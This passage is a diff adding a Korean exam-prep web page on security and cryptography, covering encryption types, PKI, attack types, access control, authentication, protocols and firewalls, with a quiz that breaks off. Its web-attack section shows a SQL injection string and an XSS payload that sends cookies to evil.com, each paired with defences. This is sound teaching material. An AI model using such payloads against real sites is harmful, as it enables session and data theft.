@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>10 보안 & 암호화 — Level-2</title>
+<style>
+:root {
+  --dark: #0f172a; --gray: #64748b; --light: #f8fafc; --border: #e2e8f0;
+  --accent: #dc2626; --accent2: #f87171;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--light); color: var(--dark); line-height: 1.7; }
+
+.hero { background: linear-gradient(135deg, #020617 0%, #0f172a 50%, #450a0a 100%); color: white; padding: 2.5rem 1.5rem 2rem; }
+.hero-inner { max-width: 960px; margin: 0 auto; }
+.hero-back { font-size: 0.78rem; color: #94a3b8; text-decoration: none; display: inline-flex; align-items: center; gap: 0.3rem; margin-bottom: 1rem; }
+.hero-back:hover { color: white; }
+.hero h1 { font-size: 1.75rem; font-weight: 800; margin-bottom: 0.3rem; }
+.hero p { color: #fca5a5; font-size: 0.88rem; }
+.hero-meta { display: flex; gap: 0.5rem; margin-top: 0.7rem; flex-wrap: wrap; }
+.htag { background: rgba(255,255,255,0.12); padding: 0.22rem 0.65rem; border-radius: 20px; font-size: 0.75rem; }
+
+.container { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+
+.toc { background: white; border: 1px solid var(--border); border-radius: 12px; padding: 1.2rem 1.5rem; margin-bottom: 2rem; }
+.toc-title { font-size: 0.78rem; font-weight: 700; color: var(--gray); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.7rem; }
+.toc-list { display: flex; flex-wrap: wrap; gap: 0.4rem; }
+.toc-list a { font-size: 0.8rem; color: var(--accent); text-decoration: none; border: 1px solid #fecaca; background: #fff1f2; padding: 0.2rem 0.6rem; border-radius: 8px; }
+.toc-list a:hover { background: #fee2e2; }
+
+.sec-title { font-size: 1.3rem; font-weight: 800; margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 2px solid var(--accent); display: flex; align-items: center; gap: 0.5rem; }
+.sec-num { background: var(--accent); color: white; font-size: 0.72rem; font-weight: 700; padding: 0.18rem 0.55rem; border-radius: 20px; }
+
+.info  { background: #fff1f2; border: 1px solid #fecaca; border-radius: 10px; padding: 1rem 1.2rem; font-size: 0.84rem; color: #7f1d1d; margin: 1rem 0; }
+.warn  { background: #fef9c3; border: 1px solid #fde047; border-radius: 10px; padding: 1rem 1.2rem; font-size: 0.84rem; color: #713f12; margin: 1rem 0; }
+.tip   { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 10px; padding: 1rem 1.2rem; font-size: 0.84rem; color: #166534; margin: 1rem 0; }
+.blue  { background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 10px; padding: 1rem 1.2rem; font-size: 0.84rem; color: #1e3a8a; margin: 1rem 0; }
+
+.tbl-wrap { overflow-x: auto; margin: 0.7rem 0; -webkit-overflow-scrolling: touch; overscroll-behavior-x: contain; }
+.tbl-wrap::before { content: '← 좌우 스크롤'; display: none; font-size: 0.68rem; color: var(--gray); text-align: right; padding: 0.3rem 0; }
+
+.g-tbl { width: 100%; border-collapse: collapse; font-size: 0.84rem; }
+.g-tbl th { background: #0f172a; color: #fca5a5; padding: 0.5rem 0.8rem; text-align: left; font-size: 0.77rem; font-weight: 700; }
+.g-tbl td { padding: 0.45rem 0.8rem; border-bottom: 1px solid var(--border); }
+.g-tbl tr:nth-child(even) td { background: #fafafa; }
+.g-tbl tr:hover td { background: #fff1f2; }
+code { background: #f1f5f9; padding: 0.1rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.82rem; }
+
+.concept { background: white; border: 1px solid var(--border); border-radius: 12px; padding: 1.3rem 1.5rem; margin-bottom: 1.1rem; }
+.concept h4 { font-size: 0.92rem; font-weight: 700; margin-bottom: 0.8rem; display: flex; align-items: center; gap: 0.4rem; }
+.concept h4::before { content: '▸'; color: var(--accent); }
+
+/* crypto cards */
+.crypto-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.8rem; margin: 1rem 0; }
+.crypto-card { background: white; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
+.crypto-head { padding: 0.6rem 0.9rem; font-size: 0.78rem; font-weight: 700; color: white; }
+.crypto-head.sym  { background: #dc2626; }
+.crypto-head.asym { background: #7c3aed; }
+.crypto-head.hash { background: #0d9488; }
+.crypto-body { padding: 0.7rem 0.9rem; }
+.crypto-body p { font-size: 0.76rem; color: var(--gray); margin: 0.2rem 0; }
+.crypto-body .algo { font-size: 0.78rem; font-weight: 700; color: var(--dark); margin-top: 0.5rem; }
+
+/* attack cards */
+.atk-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.8rem; margin: 1rem 0; }
+.atk-card { background: white; border-left: 4px solid var(--accent); border-radius: 0 10px 10px 0; border-top: 1px solid var(--border); border-right: 1px solid var(--border); border-bottom: 1px solid var(--border); padding: 0.9rem 1rem; }
+.atk-name { font-size: 0.88rem; font-weight: 700; color: var(--accent); margin-bottom: 0.3rem; }
+.atk-desc { font-size: 0.77rem; color: #374151; margin-bottom: 0.3rem; }
+.atk-prevent { font-size: 0.74rem; color: #15803d; background: #f0fdf4; border-radius: 6px; padding: 0.3rem 0.5rem; }
+
+/* access control */
+.ac-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.8rem; margin: 1rem 0; }
+.ac-card { background: white; border: 1px solid var(--border); border-radius: 10px; padding: 1rem; }
+.ac-name { font-size: 0.88rem; font-weight: 700; margin-bottom: 0.2rem; }
+.ac-ko { font-size: 0.72rem; color: var(--gray); margin-bottom: 0.5rem; }
+.ac-body { font-size: 0.77rem; color: #374151; }
+.ac-tag { display: inline-block; font-size: 0.68rem; padding: 0.1rem 0.45rem; border-radius: 20px; margin-top: 0.4rem; font-weight: 700; }
+.tag-r { background: #fee2e2; color: #991b1b; }
+.tag-g { background: #dcfce7; color: #15803d; }
+.tag-b { background: #dbeafe; color: #1e40af; }
+
+/* protocol layer */
+.layer-wrap { display: flex; flex-direction: column; gap: 0.35rem; margin: 0.8rem 0; }
+.layer-row { display: flex; align-items: stretch; gap: 0.5rem; }
+.layer-num { background: #0f172a; color: #fca5a5; font-size: 0.7rem; font-weight: 700; padding: 0.35rem 0.6rem; border-radius: 6px; display: flex; align-items: center; min-width: 70px; justify-content: center; }
+.layer-content { background: white; border: 1px solid var(--border); border-radius: 6px; padding: 0.35rem 0.8rem; flex: 1; font-size: 0.8rem; display: flex; align-items: center; gap: 0.5rem; }
+.layer-prot { font-weight: 700; color: var(--accent); }
+.layer-desc { font-size: 0.72rem; color: var(--gray); }
+
+/* quiz */
+.quiz-wrap { display: flex; flex-direction: column; gap: 1.1rem; margin-top: 1rem; }
+.quiz-card { background: white; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+.quiz-q {
+  padding: 1rem 1.2rem; font-size: 0.88rem; font-weight: 600; cursor: pointer;
+  display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem;
+  touch-action: manipulation; -webkit-tap-highlight-color: transparent; user-select: none; min-height: 52px;
+}
+.quiz-q:hover { background: #fff1f2; }
+.quiz-badge { font-size: 0.68rem; font-weight: 700; padding: 0.15rem 0.5rem; border-radius: 20px; white-space: nowrap; flex-shrink: 0; }
+.quiz-badge.year { background: #fecaca; color: #7f1d1d; }
+.quiz-badge.sim  { background: #e0e7ff; color: #4338ca; }
+.quiz-chevron { font-size: 0.75rem; color: var(--gray); flex-shrink: 0; margin-top: 0.1rem; transition: transform 0.2s; }
+.quiz-card.open .quiz-chevron { transform: rotate(180deg); }
+.quiz-ans { display: none; padding: 0 1.2rem 1.1rem; border-top: 1px solid var(--border); }
+.quiz-card.open .quiz-ans { display: block; }
+.ans-label { font-size: 0.7rem; font-weight: 700; color: var(--accent); text-transform: uppercase; margin: 0.8rem 0 0.3rem; }
+.ans-val   { font-size: 0.95rem; font-weight: 700; color: var(--dark); }
+.ans-explain { font-size: 0.82rem; color: #374151; margin-top: 0.5rem; line-height: 1.65; }
+
+/* code snippet */
+.code-block { background: #0f172a; color: #e2e8f0; border-radius: 8px; padding: 0.9rem 1.1rem; font-family: 'Courier New', monospace; font-size: 0.79rem; line-height: 1.6; margin: 0.7rem 0; overflow-x: auto; }
+.c-bad  { color: #f87171; }
+.c-good { color: #86efac; }
+.c-cmt  { color: #94a3b8; font-style: italic; }
+.c-str  { color: #fde68a; }
+
+@media (max-width: 640px) {
+  .hero { padding: 1.8rem 1rem 1.5rem; }
+  .hero h1 { font-size: 1.25rem; }
+  .container { padding: 1.5rem 0.9rem 3rem; }
+  .sec-title { font-size: 1.1rem; margin: 2rem 0 0.85rem; }
+  .tbl-wrap::before { display: block; }
+  .g-tbl { font-size: 0.76rem; }
+  .g-tbl th, .g-tbl td { padding: 0.35rem 0.6rem; }
+  .crypto-grid { grid-template-columns: 1fr; }
+  .atk-grid { grid-template-columns: 1fr; }
+  .ac-grid { grid-template-columns: 1fr; }
+  .concept { padding: 1rem; }
+  .info, .warn, .tip, .blue { font-size: 0.8rem; padding: 0.85rem 1rem; }
+  .quiz-q { padding: 0.9rem 1rem; font-size: 0.83rem; }
+  .quiz-ans { padding: 0 1rem 1rem; }
+  .ans-val { font-size: 0.88rem; }
+  .ans-explain { font-size: 0.79rem; }
+  .code-block { font-size: 0.72rem; }
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="hero-inner">
+    <a class="hero-back" href="index.html">← Level-2 목록</a>
+    <h1>🔐 보안 & 암호화</h1>
+    <p>암호화 · 공격 유형 · 접근 제어 · 인증 · 보안 프로토콜 · 방화벽</p>
+    <div class="hero-meta">
+      <span class="htag">출제 빈도 ★★★☆☆</span>
+      <span class="htag">10번</span>
+      <span class="htag">암호화 · 공격유형 필수</span>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="toc">
+    <div class="toc-title">목차</div>
+    <div class="toc-list">
+      <a href="#crypto">암호화 분류</a>
+      <a href="#pki">PKI & 전자서명</a>
+      <a href="#attack">공격 유형</a>
+      <a href="#web-attack">웹 공격</a>
+      <a href="#access">접근 제어</a>
+      <a href="#auth">인증</a>
+      <a href="#protocol">보안 프로토콜</a>
+      <a href="#firewall">방화벽·IDS·IPS</a>
+      <a href="#quiz">기출 문제</a>
+    </div>
+  </div>
+
+  <!-- ① 암호화 -->
+  <div class="sec-title" id="crypto"><span class="sec-num">01</span> 암호화 분류</div>
+
+  <div class="crypto-grid">
+    <div class="crypto-card">
+      <div class="crypto-head sym">🔑 대칭키 암호화</div>
+      <div class="crypto-body">
+        <p>암호화·복호화에 <strong>같은 키</strong> 사용</p>
+        <p>빠름 / 키 배송 문제 존재</p>
+        <p>대용량 데이터 암호화에 적합</p>
+        <div class="algo">DES · 3DES · AES · SEED · ARIA · IDEA · Blowfish</div>
+      </div>
+    </div>
+    <div class="crypto-card">
+      <div class="crypto-head asym">🗝️ 비대칭키 (공개키)</div>
+      <div class="crypto-body">
+        <p><strong>공개키</strong>로 암호화 → <strong>개인키</strong>로 복호화</p>
+        <p>느림 / 키 배송 문제 없음</p>
+        <p>키 교환·전자서명에 적합</p>
+        <div class="algo">RSA · ECC · DH · DSA · ElGamal</div>
+      </div>
+    </div>
+    <div class="crypto-card">
+      <div class="crypto-head hash">📋 해시 함수</div>
+      <div class="crypto-body">
+        <p><strong>단방향</strong> — 복호화 불가</p>
+        <p>입력 길이 무관, 고정 출력</p>
+        <p>무결성 검증·비밀번호 저장</p>
+        <div class="algo">MD5(128) · SHA-1(160) · SHA-256 · SHA-512 · HAS-160</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="concept">
+    <h4>대칭키 vs 비대칭키 비교표</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>구분</th><th>대칭키</th><th>비대칭키(공개키)</th></tr>
+        <tr><td>키 수</td><td>1개 (동일한 키)</td><td>2개 (공개키 + 개인키)</td></tr>
+        <tr><td>속도</td><td>빠름 (⬡ 하드웨어 구현 용이)</td><td>느림 (수학적 연산 복잡)</td></tr>
+        <tr><td>키 배송</td><td>문제 있음 (안전한 채널 필요)</td><td>문제 없음 (공개키는 공개)</td></tr>
+        <tr><td>키 관리</td><td>n(n-1)/2개 필요 (n명 통신)</td><td>2n개 필요 (n명 통신)</td></tr>
+        <tr><td>주요 용도</td><td>대용량 파일 암호화, 디스크 암호화</td><td>키 교환, 전자서명, 인증서</td></tr>
+        <tr><td>대표 알고리즘</td><td>AES(128/192/256비트), SEED(128비트)</td><td>RSA(2048비트+), ECC</td></tr>
+      </table>
+    </div>
+    <div class="tip">✅ 실무: 하이브리드 암호화 — 비대칭키로 세션키(대칭키)를 안전하게 교환 → 이후 대칭키로 데이터 암호화 (SSL/TLS 방식)</div>
+  </div>
+
+  <div class="concept">
+    <h4>해시 함수 특성 (3가지 반드시 암기)</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>특성</th><th>설명</th></tr>
+        <tr><td><strong>역상 저항성</strong> (Preimage Resistance)</td><td>해시값 h로부터 원문 m을 구하는 것이 계산적으로 불가능</td></tr>
+        <tr><td><strong>제2 역상 저항성</strong> (Second Preimage Resistance)</td><td>m의 해시값과 동일한 해시값을 가진 m'을 찾는 것이 불가능</td></tr>
+        <tr><td><strong>충돌 저항성</strong> (Collision Resistance)</td><td>H(m₁)=H(m₂)인 서로 다른 m₁, m₂를 찾는 것이 불가능</td></tr>
+      </table>
+    </div>
+    <div class="warn">⚠️ MD5, SHA-1은 충돌 취약점 발견 → 보안 용도로 사용 불가. SHA-256 이상 사용 권장.</div>
+  </div>
+
+  <!-- ② PKI -->
+  <div class="sec-title" id="pki"><span class="sec-num">02</span> PKI & 전자서명</div>
+
+  <div class="concept">
+    <h4>전자서명 (Digital Signature) 과정</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>단계</th><th>송신자 (서명)</th><th>수신자 (검증)</th></tr>
+        <tr><td>①</td><td>원문 m을 해시 → 해시값 h 생성</td><td>수신한 원문 m'을 해시 → h' 생성</td></tr>
+        <tr><td>②</td><td>해시값 h를 <strong>개인키</strong>로 암호화 → 서명값 s</td><td>서명값 s를 <strong>공개키</strong>로 복호화 → h 획득</td></tr>
+        <tr><td>③</td><td>원문 m + 서명값 s 전송</td><td>h == h' 이면 무결성·인증 확인</td></tr>
+      </table>
+    </div>
+    <div class="tip">✅ 암기: 서명 = <strong>개인키로 암호화</strong> / 검증 = <strong>공개키로 복호화</strong> (일반 암호화와 반대!)<br>
+    서명의 목적: ① 무결성 ② 인증 ③ 부인 방지</div>
+  </div>
+
+  <div class="concept">
+    <h4>PKI (Public Key Infrastructure) 구성요소</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>구성요소</th><th>역할</th></tr>
+        <tr><td><strong>CA</strong> (인증기관)</td><td>공개키 인증서 발급·폐기·관리 (공인인증기관)</td></tr>
+        <tr><td><strong>RA</strong> (등록기관)</td><td>사용자 신원 확인 후 CA에 인증서 발급 요청 위탁</td></tr>
+        <tr><td><strong>CRL</strong> (인증서 폐기 목록)</td><td>유효기간 내 폐기된 인증서 목록 (OCSP로 실시간 확인)</td></tr>
+        <tr><td><strong>디지털 인증서</strong></td><td>공개키 + 소유자 정보 + CA 서명 묶음 (X.509 형식)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ③ 공격 유형 -->
+  <div class="sec-title" id="attack"><span class="sec-num">03</span> 네트워크 공격 유형</div>
+
+  <div class="atk-grid">
+    <div class="atk-card">
+      <div class="atk-name">DoS (서비스 거부 공격)</div>
+      <div class="atk-desc">단일 공격자가 대량 트래픽·요청으로 서버 자원 소진시켜 정상 서비스 불가</div>
+      <div class="atk-prevent">✅ 대응: 방화벽, IPS, 대역폭 제한, Rate Limiting</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">DDoS (분산 서비스 거부)</div>
+      <div class="atk-desc">다수의 좀비PC(봇넷)로 동시 공격. 공격 출처 추적 어려움</div>
+      <div class="atk-prevent">✅ 대응: CDN, Anti-DDoS 서비스, 블랙홀 라우팅</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">스니핑 (Sniffing)</div>
+      <div class="atk-desc">네트워크 패킷을 도청하여 데이터(비밀번호, 세션 등) 탈취. 수동적 공격</div>
+      <div class="atk-prevent">✅ 대응: 암호화(TLS/SSH), 스위치 사용, VPN</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">스푸핑 (Spoofing)</div>
+      <div class="atk-desc">IP·MAC·DNS를 위조하여 신뢰할 수 있는 것처럼 속이는 공격</div>
+      <div class="atk-prevent">✅ 대응: 패킷 필터링, 인증 강화, IP 검증</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">세션 하이재킹</div>
+      <div class="atk-desc">인증된 세션 ID를 탈취하여 정상 사용자 권한으로 접근</div>
+      <div class="atk-prevent">✅ 대응: 세션 ID 갱신, HTTPS, HttpOnly 쿠키</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">버퍼 오버플로우</div>
+      <div class="atk-desc">버퍼 크기 초과 입력으로 인접 메모리 덮어씀 → 임의 코드 실행</div>
+      <div class="atk-prevent">✅ 대응: 입력값 검증, ASLR, 스택 가드, 안전한 함수 사용</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">레인보우 테이블 공격</div>
+      <div class="atk-desc">미리 계산된 해시값 목록으로 비밀번호 역추적 (무차별 대입 최적화)</div>
+      <div class="atk-prevent">✅ 대응: 솔트(Salt) 추가, bcrypt·Argon2 사용</div>
+    </div>
+    <div class="atk-card">
+      <div class="atk-name">중간자 공격 (MITM)</div>
+      <div class="atk-desc">통신 중간에서 도청·변조. ARP 스푸핑으로 시작하는 경우 多</div>
+      <div class="atk-prevent">✅ 대응: 인증서 검증(PKI), HSTS, VPN</div>
+    </div>
+  </div>
+
+  <!-- ④ 웹 공격 -->
+  <div class="sec-title" id="web-attack"><span class="sec-num">04</span> 웹 보안 공격 (자주 출제)</div>
+
+  <div class="concept">
+    <h4>SQL Injection — 입력값으로 SQL 조작</h4>
+    <div class="code-block"><span class="c-cmt">-- 취약한 쿼리 (문자열 직접 연결)</span>
+<span class="c-bad">SELECT * FROM users WHERE id='<input>' AND pw='<input>'</span>
+
+<span class="c-cmt">-- 공격: id에 ' OR '1'='1 입력 → 항상 참이 됨</span>
+<span class="c-bad">SELECT * FROM users WHERE id='' OR '1'='1' AND pw=''</span>
+
+<span class="c-cmt">-- 대응: Prepared Statement (바인딩 파라미터)</span>
+<span class="c-good">SELECT * FROM users WHERE id=? AND pw=?</span></div>
+    <div class="tip">✅ 대응: ① Prepared Statement (가장 효과적) ② 입력값 이스케이핑 ③ 최소 권한 DB 계정</div>
+  </div>
+
+  <div class="concept">
+    <h4>XSS (Cross-Site Scripting) — 스크립트 삽입</h4>
+    <div class="code-block"><span class="c-cmt">-- 공격자가 게시판에 악성 스크립트 삽입</span>
+<span class="c-bad">&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="c-cmt">-- 다른 사용자가 게시글 열람 시 스크립트 실행 → 쿠키 탈취</span>
+
+<span class="c-cmt">-- 대응: 출력 시 HTML 이스케이핑</span>
+<span class="c-good">&lt; → &amp;lt;  &gt; → &amp;gt;  &amp; → &amp;amp;</span></div>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>유형</th><th>특징</th></tr>
+        <tr><td><strong>반사형 (Reflected)</strong></td><td>URL에 스크립트 포함 → 서버가 그대로 응답에 반사</td></tr>
+        <tr><td><strong>저장형 (Stored)</strong></td><td>DB에 스크립트 저장 → 다른 사용자 조회 시 실행 (더 위험)</td></tr>
+        <tr><td><strong>DOM 기반</strong></td><td>서버 거치지 않고 클라이언트 DOM 조작</td></tr>
+      </table>
+    </div>
+    <div class="tip">✅ 대응: ① 출력 인코딩 ② CSP(Content Security Policy) ③ HttpOnly 쿠키</div>
+  </div>
+
+  <div class="concept">
+    <h4>CSRF vs XSS 비교</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>구분</th><th>XSS</th><th>CSRF</th></tr>
+        <tr><td>공격 방향</td><td>서버 → 피해자 (서버에서 악성 스크립트 전달)</td><td>피해자 → 서버 (피해자 권한으로 서버에 요청)</td></tr>
+        <tr><td>목적</td><td>세션 탈취, 정보 탈취</td><td>피해자 권한으로 원치 않는 행위 유도</td></tr>
+        <tr><td>핵심 대응</td><td>출력 인코딩, CSP</td><td>CSRF 토큰, SameSite 쿠키, Referer 검증</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ⑤ 접근 제어 -->
+  <div class="sec-title" id="access"><span class="sec-num">05</span> 접근 제어 모델</div>
+
+  <div class="ac-grid">
+    <div class="ac-card">
+      <div class="ac-name">DAC</div>
+      <div class="ac-ko">임의적 접근 제어 (Discretionary)</div>
+      <div class="ac-body">데이터 <strong>소유자</strong>가 직접 접근 권한 설정. 자유롭지만 보안 취약.</div>
+      <span class="ac-tag tag-r">유연성 高</span>
+      <span class="ac-tag tag-r">보안성 低</span>
+      <div class="ac-body" style="margin-top:0.4rem; font-size:0.72rem; color:var(--gray);">예: 유닉스 chmod, 윈도우 파일 권한</div>
+    </div>
+    <div class="ac-card">
+      <div class="ac-name">MAC</div>
+      <div class="ac-ko">강제적 접근 제어 (Mandatory)</div>
+      <div class="ac-body"><strong>시스템·정책</strong>이 보안 등급 기반으로 접근 제어. 매우 엄격.</div>
+      <span class="ac-tag tag-g">보안성 高</span>
+      <span class="ac-tag tag-g">군사·기밀 환경</span>
+      <div class="ac-body" style="margin-top:0.4rem; font-size:0.72rem; color:var(--gray);">예: SELinux, 군사 보안 시스템</div>
+    </div>
+    <div class="ac-card">
+      <div class="ac-name">RBAC</div>
+      <div class="ac-ko">역할 기반 접근 제어 (Role-Based)</div>
+      <div class="ac-body">사용자 → <strong>역할</strong> → 권한 부여. 관리가 쉽고 현대적.</div>
+      <span class="ac-tag tag-b">기업 환경 표준</span>
+      <span class="ac-tag tag-b">관리 용이</span>
+      <div class="ac-body" style="margin-top:0.4rem; font-size:0.72rem; color:var(--gray);">예: 관리자/직원/게스트 역할 분리</div>
+    </div>
+  </div>
+
+  <!-- ⑥ 인증 -->
+  <div class="sec-title" id="auth"><span class="sec-num">06</span> 인증 (Authentication)</div>
+
+  <div class="tbl-wrap">
+    <table class="g-tbl">
+      <tr><th>인증 요소</th><th>유형</th><th>예시</th><th>특징</th></tr>
+      <tr><td><strong>지식 기반</strong><br>Something you Know</td><td>비밀번호, PIN, 보안 질문</td><td>비밀번호 1234</td><td>간편, 탈취·망각 위험</td></tr>
+      <tr><td><strong>소유 기반</strong><br>Something you Have</td><td>OTP, 스마트카드, 보안 토큰</td><td>OTP 앱, 공인인증서</td><td>분실 위험, 지식보다 강함</td></tr>
+      <tr><td><strong>생체 기반</strong><br>Something you Are</td><td>지문, 얼굴, 홍채, 정맥</td><td>지문인식, FaceID</td><td>편리, 변경 불가, 오인식률</td></tr>
+      <tr><td><strong>행동 기반</strong><br>Something you Do</td><td>서명, 키스트로크 패턴, 걸음걸이</td><td>전자 서명</td><td>행동 패턴 분석</td></tr>
+    </table>
+  </div>
+
+  <div class="blue">💡 <strong>MFA (Multi-Factor Authentication)</strong>: 2가지 이상의 인증 요소 조합. 예: 비밀번호(지식) + OTP(소유) → 2FA<br>
+  <strong>인증 vs 인가</strong>: 인증(Authentication) = "너 누구야?" / 인가(Authorization) = "너 뭘 할 수 있어?"</div>
+
+  <!-- ⑦ 보안 프로토콜 -->
+  <div class="sec-title" id="protocol"><span class="sec-num">07</span> 보안 프로토콜</div>
+
+  <div class="concept">
+    <h4>OSI 계층별 보안 프로토콜</h4>
+    <div class="layer-wrap">
+      <div class="layer-row">
+        <div class="layer-num">7계층<br>응용</div>
+        <div class="layer-content">
+          <span class="layer-prot">S/MIME</span><span class="layer-desc">이메일 보안 (서명·암호화)</span>
+          <span class="layer-prot" style="margin-left:1rem;">PGP</span><span class="layer-desc">이메일 암호화</span>
+          <span class="layer-prot" style="margin-left:1rem;">SSH</span><span class="layer-desc">원격 접속 보안 (Telnet 대체)</span>
+        </div>
+      </div>
+      <div class="layer-row">
+        <div class="layer-num">4/5계층<br>전송/세션</div>
+        <div class="layer-content">
+          <span class="layer-prot">TLS/SSL</span><span class="layer-desc">전송계층 암호화. HTTPS, FTPS, SMTPS 등에 사용</span>
+        </div>
+      </div>
+      <div class="layer-row">
+        <div class="layer-num">3계층<br>네트워크</div>
+        <div class="layer-content">
+          <span class="layer-prot">IPSec</span><span class="layer-desc">IP 패킷 암호화·인증. VPN 구현에 사용</span>
+        </div>
+      </div>
+      <div class="layer-row">
+        <div class="layer-num">2계층<br>데이터링크</div>
+        <div class="layer-content">
+          <span class="layer-prot">L2TP</span><span class="layer-desc">VPN 터널링 (IPSec과 결합하여 사용)</span>
+          <span class="layer-prot" style="margin-left:1rem;">WPA3</span><span class="layer-desc">무선랜 보안</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="concept">
+    <h4>IPSec 동작 모드</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>모드</th><th>암호화 대상</th><th>용도</th></tr>
+        <tr><td><strong>전송 모드</strong> (Transport)</td><td>IP 페이로드만 암호화 (헤더 보존)</td><td>종단 간 통신 (호스트-호스트)</td></tr>
+        <tr><td><strong>터널 모드</strong> (Tunnel)</td><td>원본 IP 패킷 전체 암호화 + 새 IP 헤더</td><td>VPN 게이트웨이 간 통신 (더 많이 사용)</td></tr>
+      </table>
+    </div>
+
+    <div class="tbl-wrap" style="margin-top:0.7rem;">
+      <table class="g-tbl">
+        <tr><th>IPSec 프로토콜</th><th>기능</th><th>암호화</th></tr>
+        <tr><td><strong>AH</strong> (Authentication Header)</td><td>인증·무결성 (IP 헤더 포함)</td><td>❌ 암호화 없음</td></tr>
+        <tr><td><strong>ESP</strong> (Encapsulating Security Payload)</td><td>인증 + 무결성 + <strong>기밀성</strong></td><td>✅ 암호화 포함</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="concept">
+    <h4>SSL/TLS 핸드셰이크 요약</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>단계</th><th>클라이언트→서버</th><th>서버→클라이언트</th></tr>
+        <tr><td>①</td><td>ClientHello (지원 암호 목록, 랜덤값)</td><td>ServerHello (선택된 암호, 랜덤값)</td></tr>
+        <tr><td>②</td><td></td><td>인증서 전송 (서버 공개키 포함)</td></tr>
+        <tr><td>③</td><td>인증서 검증 → Pre-Master Secret 생성 → 서버 공개키로 암호화 전송</td><td></td></tr>
+        <tr><td>④</td><td colspan="2">양측이 Pre-Master Secret으로 대칭 세션키 생성 → 이후 대칭키로 통신</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ⑧ 방화벽/IDS/IPS -->
+  <div class="sec-title" id="firewall"><span class="sec-num">08</span> 방화벽 · IDS · IPS</div>
+
+  <div class="tbl-wrap">
+    <table class="g-tbl">
+      <tr><th>구분</th><th>역할</th><th>위치</th><th>특징</th></tr>
+      <tr>
+        <td><strong>방화벽</strong><br>(Firewall)</td>
+        <td>IP/포트 기반 트래픽 차단·허용</td>
+        <td>경계(인터넷-내부망)</td>
+        <td>정책 기반, L3·L4 필터링</td>
+      </tr>
+      <tr>
+        <td><strong>IDS</strong><br>(침입탐지시스템)</td>
+        <td>이상 트래픽·침입 <strong>탐지만</strong> (알림)</td>
+        <td>내부망 미러 포트</td>
+        <td>수동적 모니터링, 차단 불가</td>
+      </tr>
+      <tr>
+        <td><strong>IPS</strong><br>(침입방지시스템)</td>
+        <td>탐지 + <strong>자동 차단</strong></td>
+        <td>인라인(패킷 경유)</td>
+        <td>능동적 대응, 오탐 시 정상 차단 위험</td>
+      </tr>
+      <tr>
+        <td><strong>WAF</strong><br>(웹 방화벽)</td>
+        <td>웹 공격(XSS·SQLi·CSRF) 탐지·차단</td>
+        <td>웹서버 앞단</td>
+        <td>L7 필터링, OWASP Top10 대응</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="concept">
+    <h4>IDS 탐지 방식</h4>
+    <div class="tbl-wrap">
+      <table class="g-tbl">
+        <tr><th>방식</th><th>원리</th><th>장점</th><th>단점</th></tr>
+        <tr><td><strong>오용(서명) 탐지</strong><br>Signature-based</td><td>알려진 공격 패턴(서명)과 비교</td><td>오탐율 낮음, 빠른 판단</td><td>새로운 공격(0-day) 탐지 불가</td></tr>
+        <tr><td><strong>이상 탐지</strong><br>Anomaly-based</td><td>정상 행동 프로파일과 비교</td><td>새로운 공격도 탐지 가능</td><td>오탐율 높음, 프로파일 구축 필요</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ⑨ 기출 문제 -->
+  <div class="sec-title" id="quiz"><span class="sec-num">09</span> 기출 문제</div>
+
+  <div class="quiz-wrap">
+
+    <!-- Q1 -->
+    <div class="quiz-card">
+      <div class="quiz-q" onclick="toggle(this)">
+        <div>
+          <span class="quiz-badge year">기출 빈출</span>&nbsp;
+          대칭키 암호화와 비대칭키 암호화의 차이점을 키 개수, 속도, 용도 측면에서 비교하시오.
+        </div>
+        <span class="quiz-chevron">▼</span>
+      </div>
+      <div class="quiz-ans">
+        <div class="ans-label">정답</div>
+        <div class="ans-val">대칭키: 동일 키 1개, 빠름, 대용량 암호화<br>비대칭키: 공개키+개인키 쌍, 느림, 키 교환·서명</div>
+        <div class="ans-explain">
+          <strong>대칭키</strong>: 암복호화에 동일 키 사용 / AES·SEED·DES / 빠름 / 키 배송 문제 있음<br>
